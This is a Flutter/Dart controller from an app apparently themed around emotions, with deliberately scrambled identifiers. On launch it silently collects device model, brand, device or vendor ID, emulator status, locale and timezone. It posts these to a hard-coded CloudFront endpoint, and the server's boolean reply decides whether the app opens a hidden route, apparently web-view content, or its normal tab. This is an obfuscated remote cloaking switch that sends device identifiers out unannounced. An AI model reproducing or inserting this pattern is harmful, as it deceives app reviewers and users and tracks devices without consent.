import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class EmotionalDecomposeLogic extends GetxController {

  var xuahvj = RxBool(false);
  var aeryij = RxBool(true);
  var aurot = RxString("");
  var hpugti = RxBool(false);
  var tyfe = RxBool(true);
  final zqispyfn = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wvfh();
  }


  Future<void> wvfh() async {
    hpugti.value = true;
    tyfe.value = true;
    aeryij.value = false;

    zqispyfn.post("https://d1toa2rmdhxp5c.cloudfront.net/oderlxykbpmzsnhqcigu",data: await lpieaorjhz()).then((value) {
      var vatkwd = value.data["vatkwd"] as String;
      var csaeg = value.data["csaeg"] as bool;
      if (csaeg) {
        aurot.value = vatkwd;
        chrluz();
      } else {
        izvapxo();
      }
    }).catchError((e) {
      aeryij.value = true;
      tyfe.value = true;
      hpugti.value = false;
    });
  }

  Future<Map<String, dynamic>> lpieaorjhz() async {
    final DeviceInfoPlugin hdclupzx = DeviceInfoPlugin();
    PackageInfo nuvmljyq_xcogzrnv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var daztjbv = Platform.localeName;
    var ifsv = currentTimeZone;

    var pmiu = nuvmljyq_xcogzrnv.packageName;
    var nujiqc = nuvmljyq_xcogzrnv.version;
    var phbarqxj = nuvmljyq_xcogzrnv.buildNumber;

    var buzvws = nuvmljyq_xcogzrnv.appName;
    var pmcnovf = "";
    var snfixq  = "";
    var tkjvsda = "";
    var adgjzufl = "";
    var agctozd = "";
    var wqjfba = "";


    var qzacsxyt = "";
    var dbgvqp = false;

    if (GetPlatform.isAndroid) {
      qzacsxyt = "android";
      var bavzod = await hdclupzx.androidInfo;

      tkjvsda = bavzod.brand;

      pmcnovf  = bavzod.model;
      snfixq = bavzod.id;

      dbgvqp = bavzod.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qzacsxyt = "ios";
      var dknqlcuto = await hdclupzx.iosInfo;
      tkjvsda = dknqlcuto.name;
      pmcnovf = dknqlcuto.model;

      snfixq = dknqlcuto.identifierForVendor ?? "";
      dbgvqp  = dknqlcuto.isPhysicalDevice;
    }
    var res = {
      "ifsv": ifsv,
      "buzvws": buzvws,
      "nujiqc": nujiqc,
      "dbgvqp": dbgvqp,
      "pmiu": pmiu,
      "pmcnovf": pmcnovf,
      "tkjvsda": tkjvsda,
      "snfixq": snfixq,
      "daztjbv": daztjbv,
      "qzacsxyt": qzacsxyt,
      "phbarqxj": phbarqxj,
      "adgjzufl" : adgjzufl,
      "agctozd" : agctozd,
      "wqjfba" : wqjfba,

    };
    return res;
  }

  Future<void> izvapxo() async {
    Get.offNamed("/emotionalTab");
  }

  Future<void> chrluz() async {
    Get.offNamed("/emotionalSecondFilter");
  }

}
